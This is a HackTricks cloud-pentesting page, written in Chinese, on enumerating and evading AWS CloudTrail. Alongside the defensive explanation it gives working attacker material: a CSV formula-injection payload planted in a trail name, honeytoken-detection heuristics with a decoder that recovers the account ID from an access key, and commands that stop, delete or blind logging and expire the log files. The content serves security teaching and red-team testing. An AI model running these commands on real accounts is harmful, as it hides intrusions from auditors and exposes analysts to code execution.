# AWS - CloudTrail Enum

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中被广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## **CloudTrail**

AWS CloudTrail **记录和监视您的AWS环境中的活动**。它捕获详细的**事件日志**，包括谁在什么时候从哪里做了什么，与AWS资源的所有交互。这提供了变更和操作的审计跟踪，有助于安全分析，合规审计和资源变更跟踪。CloudTrail对于理解用户和资源行为，增强安全姿态以及确保合规性至关重要。

每个记录的事件包含：

* 调用的API名称：`eventName`
* 调用的服务：`eventSource`
* 时间：`eventTime`
* IP地址：`SourceIPAddress`
* 代理方法：`userAgent`。例如：
  * Signing.amazonaws.com - 来自AWS管理控制台
  * console.amazonaws.com - 帐户的根用户
  * lambda.amazonaws.com - AWS Lambda
* 请求参数：`requestParameters`
* 响应元素：`responseElements`

事件**大约每5分钟写入一个新的日志文件中**，由CloudTrail保存，最终**在大约15分钟后将日志文件传送到S3**。\
CloudTrail日志可以**跨帐户和跨区域进行聚合**。\
CloudTrail允许使用**日志文件完整性**，以便能够验证自CloudTrail将其传送给您以来，您的日志文件是否保持不变。它在摘要文件中创建日志的SHA-256哈希。每小时创建一次新日志的sha-256哈希。\
创建Trail时，事件选择器将允许您指示要记录的Trail：管理、数据或洞察事件。

日志保存在S3存储桶中。默认情况下使用服务器端加密（SSE-S3），因此AWS将为有权访问的人解密内容，但为了增加安全性，您可以使用SSE与KMS和您自己的密钥。

日志存储在具有以下名称格式的**S3存储桶中**：

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* 存储桶名称为：**`aws-cloudtrail-logs-<accountid>-<random>`**
* 示例：**`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

在每个文件夹中，每个日志将具有**以下格式的名称**：**`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

日志文件命名约定

![](<../../../../.gitbook/assets/image (29).png>)

此外，**摘要文件（用于检查文件完整性）**将位于**同一存储桶**中：

![](<../../../../.gitbook/assets/image (22).png>)

### 聚合来自多个帐户的日志

* 在要将日志文件传送到的AWS帐户中创建一个Trial
* 为目标S3存储桶应用权限，允许CloudTrail跨帐户访问，并允许需要访问的每个AWS帐户
* 在其他AWS帐户中创建新的Trail，并选择使用第1步中创建的存储桶

然而，即使您可以将所有日志保存在同一个S3存储桶中，也不能将来自多个帐户的CloudTrail日志聚合到属于单个AWS帐户的CloudWatch Logs中。

{% hint style="danger" %}
请记住，一个帐户可以启用来自CloudTrail的**不同Trail**，将相同（或不同）的日志存储在不同的存储桶中。
{% endhint %}

### 将所有组织帐户的CloudTrail聚合到1个帐户中

创建CloudTrail时，可以指示激活组织中所有帐户的CloudTrail，并将日志存储在一个存储桶中：

<figure><img src="../../../../.gitbook/assets/image (1) (1) (5).png" alt=""><figcaption></figcaption></figure>

这样，您可以轻松配置所有帐户的所有区域的CloudTrail，并将日志集中在一个帐户中（您应该保护该帐户）。

### 检查日志文件

您可以通过运行以下命令来检查日志文件是否已更改

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### 将日志发送到 CloudWatch

**CloudTrail 可以自动将日志发送到 CloudWatch，这样您就可以设置警报，以在执行可疑活动时发出警告。**\
请注意，为了允许 CloudTrail 将日志发送到 CloudWatch，需要创建一个**角色**来允许该操作。如果可能的话，建议使用 AWS 默认角色执行这些操作。此角色将允许 CloudTrail：

* CreateLogStream：允许创建 CloudWatch Logs 日志流
* PutLogEvents：将 CloudTrail 日志传送到 CloudWatch Logs 日志流

### 事件历史

CloudTrail 事件历史允许您在表格中检查已记录的日志：

![](<../../../../.gitbook/assets/image (24).png>)

### 洞察

**CloudTrail 洞察**自动**分析**来自 CloudTrail 跟踪的写入管理事件，并向您**警报**不寻常的活动。例如，如果`TerminateInstance`事件的增加与已建立的基线不同，您将看到它作为一个洞察事件。这些事件使**查找和响应不寻常的 API 活动比以往更容易**。

这些洞察存储在与 CloudTrail 日志相同的存储桶中：`BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### 安全性

| CloudTrail 日志文件完整性        | <ul><li>验证日志是否被篡改（修改或删除）</li><li><p>使用摘要文件（为每个文件创建哈希）</p><ul><li>SHA-256 哈希</li><li>SHA-256 与 RSA 用于数字签名</li><li>由 Amazon 拥有的私钥</li></ul></li><li>需要 1 小时来创建摘要文件（每小时整点执行）</li></ul> |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 阻止未经授权的访问             | <ul><li><p>使用 IAM 策略和 S3 存储桶策略</p><ul><li>安全团队 —> 管理员访问</li><li>审计员 —> 只读访问</li></ul></li><li>使用 SSE-S3/SSE-KMS 对日志进行加密</li></ul>                                                                                                                                        |
| 防止日志文件被删除 | <ul><li>使用 IAM 和存储桶策略限制删除访问</li><li>配置 S3 MFA 删除</li><li>使用日志文件验证进行验证</li></ul>                                                                                                                                                                                            |

## 访问顾问

AWS 访问顾问依赖于过去 400 天的 AWS **CloudTrail 日志来收集见解**。CloudTrail 捕获了在 AWS 帐户中进行的 AWS API 调用和相关事件的历史记录。访问顾问利用这些数据来**显示服务上次访问的时间**。通过分析 CloudTrail 日志，访问顾问可以确定 IAM 用户或角色访问了哪些 AWS 服务以及访问发生的时间。这有助于 AWS 管理员做出有根据的**权限调整**决策，因为他们可以识别长时间未访问的服务，并根据实际使用模式可能减少基于真实使用模式的过于宽泛的权限。

{% hint style="success" %}
因此，访问顾问通知有关**向用户授予的不必要权限**，以便管理员可以删除它们
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## 操作

### 枚举
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **CSV注入**

在CloudTrail中执行CSV注入是可能的，如果日志以CSV格式导出并在Excel中打开，将执行任意代码。\
以下代码将生成包含恶意负载的日志条目：
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
了解有关CSV注入的更多信息，请查看页面：

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

有关此特定技术的更多信息，请查看[https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **绕过检测**

### HoneyTokens **绕过**

HoneyTokens被创建用于**检测敏感信息的外泄**。在AWS的情况下，它们是**受监控使用的AWS密钥**，如果某事触发了使用该密钥的操作，那么肯定有人窃取了该密钥。

然而，这种监控是通过**CloudTrail**执行的，有一些**AWS服务不会将日志发送到CloudTrail**（在[此处找到列表](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)）。其中一些服务将会在有未经授权的人（HoneyToken密钥）尝试访问时，**响应**一个包含**密钥角色的ARN的错误**。

这样，攻击者可以在不触发任何日志的情况下获取密钥的ARN。在ARN中，攻击者可以看到**AWS账户ID和名称**，很容易知道HoneyToken的公司账户ID和名称，因此攻击者可以确定该令牌是否为HoneyToken。

![](<../../../../.gitbook/assets/image (65).png>)

#### **HoneyTokens检测**

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57) 可检测密钥是否属于[**Canarytokens**](https://canarytokens.org/generate)**，**[**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**，**[**SpaceSiren**](https://github.com/spacesiren/spacesiren)**：**

* 如果**`canarytokens.org`**出现在角色名称或账户ID中的错误消息中**`534261010715`**。
* 最近测试它们时，它们正在使用账户**`717712589309`**，并且名称中仍然包含**`canarytokens.com`**字符串。
* 如果**`SpaceCrab`**出现在错误消息中的角色名称中
* **SpaceSiren**使用**uuids**生成用户名：`[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* 如果**名称看起来像是随机生成的**，则很有可能是HoneyToken。

{% hint style="danger" %}
请注意，所有发现的不创建CloudTrail日志的公共API现已修复，因此您可能需要找到自己的...

或者您可以从**访问密钥**中的**编码**中获取**账户ID**，并使用您的Honeytokens AWS账户列表检查账户ID：[**在此处解释**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489)
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print ("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
{% endhint %}

有关更多信息，请查看[**原始研究**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/)。

### 访问第三方基础设施

某些AWS服务将会**生成一些基础设施**，如**数据库**或**Kubernetes**集群（EKS）。直接与这些服务（如Kubernetes API）通信的用户**不会使用AWS API**，因此CloudTrail将无法看到这种通信。

因此，拥有访问EKS权限并发现EKS API URL的用户可以在本地生成令牌，**直接与API服务通信而不被CloudTrail检测到**。

更多信息请参见：

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### 修改CloudTrail配置

#### 删除跟踪
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### 停止跟踪
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### 禁用多区域日志记录

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
{% endcode %}

#### 通过事件选择器禁用日志记录

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

在第一个示例中，一个单独的事件选择器被提供为一个带有单个对象的JSON数组。`"ReadWriteType": "ReadOnly"` 表示**事件选择器应该只捕获只读事件**（因此CloudTrail洞察 **不会检查写入**事件，例如）。

您可以根据自己的特定要求自定义事件选择器。

#### 通过S3生命周期策略删除日志

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
### 修改存储桶配置

* 删除 S3 存储桶
* 更改存储桶策略，拒绝来自 CloudTrail 服务的任何写入操作
* 向 S3 存储桶添加生命周期策略以删除对象
* 禁用用于加密 CloudTrail 日志的 KMS 密钥

### CloudTrail 勒索软件

#### S3 勒索软件

您可以**生成一个非对称密钥**，让**CloudTrail 使用该密钥加密数据**，然后**删除私钥**，这样 CloudTrail 内容就无法被恢复。\
这基本上是一个在以下链接中解释的**S3-KMS 勒索软件**：

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**KMS 勒索软件**

这是使用不同权限要求执行先前攻击的最简单方法：

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **参考资料**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 HackTricks 中看到您的**公司广告**或**下载 PDF 版本的 HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 探索[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或在 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)** 上关注我们。
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>
